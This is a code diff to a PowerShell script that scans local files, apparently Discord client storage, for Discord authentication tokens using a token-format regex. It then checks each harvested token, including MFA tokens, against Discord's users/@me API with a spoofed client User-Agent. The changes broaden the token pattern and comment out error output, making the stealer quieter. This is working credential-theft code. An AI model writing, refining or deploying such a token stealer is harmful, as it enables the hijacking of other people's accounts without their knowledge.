@@ -24,7 +24,7 @@ if ( Test-Path -LiteralPath $stable ) {
                 $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                 -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue
             } catch {
-                $_.Exception.Response.StatusCode.Value__
+               # $_.Exception.Response.StatusCode.Value__
             }
             }
             if ($r.statusCode -eq "200")
@@ -41,14 +41,14 @@ if ( Test-Path -LiteralPath $stable ) {
             $tmpID=""
             $user=""
             $r=""
-            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]*['\"']{1}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
+            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]*" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
             echo $tkn
             if ($tkn.length -gt 2) {
                 try {
                     $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                     -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue
                 } catch {
-                     $_.Exception.Response.StatusCode.Value__
+                     #$_.Exception.Response.StatusCode.Value__
             }
                 }
                 if ($r.statusCode -eq "200")
